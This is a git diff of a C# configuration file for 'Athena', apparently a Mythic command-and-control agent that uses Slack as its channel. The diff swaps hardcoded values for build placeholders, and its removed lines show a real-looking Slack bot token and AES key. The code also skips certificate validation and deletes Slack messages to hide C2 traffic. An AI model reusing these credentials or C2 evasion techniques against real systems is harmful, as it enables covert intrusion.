@@ -25,12 +25,12 @@ namespace Athena.Config
         public MythicConfig()
         {
 
-            uuid = "ce252fde-4c5f-426a-9825-e7b844ce0f68";
+            uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("20", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("10", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Slack(uuid);
             this.forwarder = new Forwarder();
@@ -55,18 +55,19 @@ namespace Athena.Config
         public string proxyPass { get; set; }
         public string proxyUser { get; set; }
         private string agent_guid = Guid.NewGuid().ToString();
+
         public Slack(string uuid)
         {
-            this.psk = "AZ/oea0g4ceOnw/thTmOjuoc2DZbFbauq8QknAm8Y58=";
-            this.encryptedExchangeCheck = bool.Parse("false");
-            this.messageToken = "xoxb-1699442376370-3485707998774-KF8YMnTBKUHfNAtm2fikr6nZ";
-            this.channel = "C03F752RT5E";
-            this.userAgent = "test";
-            this.messageChecks = int.Parse("10");
-            this.timeBetweenChecks = int.Parse("3");
-            this.proxyHost = ":";
-            this.proxyPass = "";
-            this.proxyUser = "";
+            this.psk = "AESPSK";
+            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+            this.messageToken = "slack_message_token";
+            this.channel = "slack_channel_id";
+            this.userAgent = "user_agent";
+            this.messageChecks = int.Parse("message_checks");
+            this.timeBetweenChecks = int.Parse("time_between_checks");
+            this.proxyHost = "proxy_host:proxy_port";
+            this.proxyPass = "proxy_pass";
+            this.proxyUser = "proxy_user";
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
@@ -285,7 +286,8 @@ namespace Athena.Config
                 return true;
             }
             catch (WebException e)
-            {;
+            {
+                ;
                 HttpWebResponse webRes = (HttpWebResponse)e.Response;
                 if (webRes.StatusCode == HttpStatusCode.TooManyRequests)
                 {
@@ -306,7 +308,7 @@ namespace Athena.Config
         {
             // This works for the current implemenation but may have to change in the event I need to further chunk messages.
             bool success = false;
-            foreach(var message in messages)
+            foreach (var message in messages)
             {
                 string data = "{\"channel\":\"" + this.channel + "\",\"ts\":\"" + message + "\"}";
                 success = await SendPost("https://slack.com/api/chat.delete", data);
@@ -362,7 +364,7 @@ namespace Athena.Config
                             }
                             catch (Exception e)
                             {
-\                           }
+                            }
                         }
 
                         if (messages.Count < 1)
